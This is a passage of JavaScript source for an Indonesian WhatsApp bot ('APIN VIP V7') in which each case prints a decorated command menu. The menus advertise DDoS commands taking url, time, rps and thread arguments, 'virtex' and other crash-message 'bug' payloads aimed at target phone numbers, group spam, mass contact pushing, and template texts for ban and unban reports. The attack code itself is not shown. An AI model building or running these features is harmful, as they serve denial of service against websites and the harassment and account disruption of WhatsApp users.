││✑${prefix}mikasa
││✑${prefix}miku
││✑${prefix}minato
││✑${prefix}naruto
││✑${prefix}nezuko
││✑${prefix}onepiece
││✑${prefix}pokemon
││✑${prefix}rize
││✑${prefix}sagiri
││✑${prefix}sakura
││✑${prefix}sasuke
││✑${prefix}shina
││✑${prefix}shinka
││✑${prefix}shizuka
││✑${prefix}shota
││✑${prefix}toukachan
││✑${prefix}tsunade
││✑${prefix}yukiyuki
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break

//=================================================//
case "jebehmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}pushkontakidgc idgc|teksny
││✑${prefix}pushkontakv1 idgc|teksnya
││✑${prefix}pushkontakv2 teks
││✑${prefix}pushkontakv3 replyimg|teks
││✑${prefix}savecontact idgc
││✑${prefix}jpm replyimg|teks
││✑${prefix}store
││✑${prefix}payment
││✑${prefix}addlist
││✑${prefix}dellist
││✑${prefix}updatelist
││✑${prefix}proses *reply/pesan*
││✑${prefix}done *reply/pesan*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break


case 'txtmenu':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}txtban
││✑${prefix}txtunbanperma
││✑${prefix}txtunbansetpp
││✑${prefix}txtunbanspam
││✑${prefix}txtunbantinjau
││✑${prefix}toolsddos
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break


case 'txtban':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}txtban1
││✑${prefix}txtban2
││✑${prefix}txtban3

*GMAIL PIHAK WA*
││✑${prefix}gmailwa
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break


case 'txtunbanperma':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}txtunbanperma1
││✑${prefix}txtunbanperma2
││✑${prefix}txtunbanperma3

*GMAIL PIHAK WA*
││✑${prefix}gmailwa
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break

case 'txtunbansetpp':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}txtunbansetpp1
││✑${prefix}txtunbansetpp2
││✑${prefix}txtunbansetpp3

*GMAIL PIHAK WA*
││✑${prefix}gmailwa
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break

case 'txtunbanspam':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}txtunbanspam1
││✑${prefix}txtunbanspam2
││✑${prefix}txtunbanspam3

*GMAIL PIHAK WA*
││✑${prefix}gmailwa
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break

case 'txtunbantinjau':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}txtunbantinjau

*GMAIL PIHAK WA*
││✑${prefix}gmailwa
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
//=================================================//
case "bugmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}attackweb
││✑${prefix}attackwa
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break

case "attackweb": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}ddos *url time rps thread*
││✑${prefix}attackurl *url time rps thread*
││✑${prefix}fetch *url time rps thread*
││✑${prefix}checkhost *url*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break

case "attackwa": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}attackbug
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break


case "attackmurbug": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││*BUG KHUSUS MURBUG*
││*KHUSUS GRUP , GAK BISA DI LUAR GRUP*
││
││*BUG SENDT*
││
││✑${prefix}taibug  *628xxx*
││✑${prefix}qiobugs *628xxx*
││
││*BUG JUMLAH*
││✑${prefix}qiogood *628xxx|jumlah*
││✑${prefix}qiobuger *628xxx|jumlah*
││
││*BUG EMOJIK*
││
││✑${prefix}🥵  *628xxx*
││✑${prefix}🔪 *628xxx*
││✑${prefix}🧐 *628xxx*
││✑${prefix}🥴 *628xxx*
││
││*BUG VIRUS*
││✑${prefix}senddoku *628xxx*
││✑${prefix}sendaudio *628xxx*
││
││*BUG GROUP*
││✑${prefix}spamgece *link group*
││✑${prefix}ampazzgc *link group*
││✑${prefix}qioobuggc *link group*
││
││*#NOTE : HABIS SEND BUG TUNGGU BOT NYA BILANG SUCCES BARU CEK TARGETNYA DI JAMIN *C1*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break


case "attackbug": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││*BUG EMOJI*
││✑${prefix}😂 *628xxx*
││
││*BUG VIRTEX #1*
││✑${prefix}virtex1 *628xxx*
││
││*BUG VIRTEX #2*
││✑${prefix}slayer07 *628xxx*
││✑${prefix}darkness *628xxx*
││
││*BUG LOKASI*
││✑${prefix}lokas1 *628xxx*
││
││*BUG DOKUMEN*
││✑${prefix}doku1 *628xxx*
││
││*BUG AUDIO*
││✑${prefix}audio1 *628xxx*
││
││*BUG GAMBAR*
││✑${prefix}gambar1 *628xxx*
││
